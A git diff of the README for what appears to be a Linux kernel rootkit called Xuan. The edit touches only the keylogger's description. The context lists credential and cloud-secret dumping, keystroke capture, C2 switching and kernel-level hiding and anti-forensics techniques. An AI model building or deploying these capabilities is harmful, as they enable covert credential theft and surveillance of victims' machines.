@@ -126,7 +126,7 @@ flowchart TB
 | `dump_env` | Extract sensitive environment variables (keys, tokens, passwords) |
 | `dump_cloud` | Extract cloud credentials (AWS, GCP, Azure, K8s, Docker, Terraform) |
 | `dump_ssh_agent` | List unlocked keys from running SSH agents |
-| `keylog dump` | Dump captured keystrokes (static XOR key, survives kernel upgrades) |
+| `keylog dump` | Dump captured keystrokes |
 | `keylog clear` | Clear the keylog buffer |
 | `stealth` | Check kernel module status (active/inactive) |
 | `takeover` | Switch rootkit to different C2 calendar |
@@ -143,7 +143,7 @@ flowchart TB
 - **nlink deception** — `stat`/`lstat`/`newfstatat`/`statx` results post-corrected for directories containing hidden subdirectories to defeat link-count based directory enumeration
 - **Kallsyms suppression** — module symbol table zeroed after hook installation; `/proc/kallsyms` shows zero entries for `Xuan`
 - **dmesg sanitization** — all `printk` output stripped from module; `dmesg` returns zero references to Xuan, rootkit, or keylogger
-- **Keylogger** — built into the main kernel module, auto-starts on load, captures keystrokes before they reach userspace. XOR-encrypted with a machine-derived static key; survives kernel upgrades. Output stored on disk inside already-hidden directory.
+- **Keylogger** — built into the main kernel module, auto-starts on load, captures keystrokes before they reach userspace. XOR-encrypted with a machine-derived key; survives kernel upgrades. Output stored on disk inside already-hidden directory.
 - **Anti-debug** — debugger attachment blocked on rootkit process via ptrace hook
 - **finit_module hook** — pass-through (no longer blocks module loads); WiFi drivers and legitimate kernel modules load normally
 - **`/proc/<pid>/fd` hidden** — open file descriptors invisible, preventing enumeration of keylogger output and config files
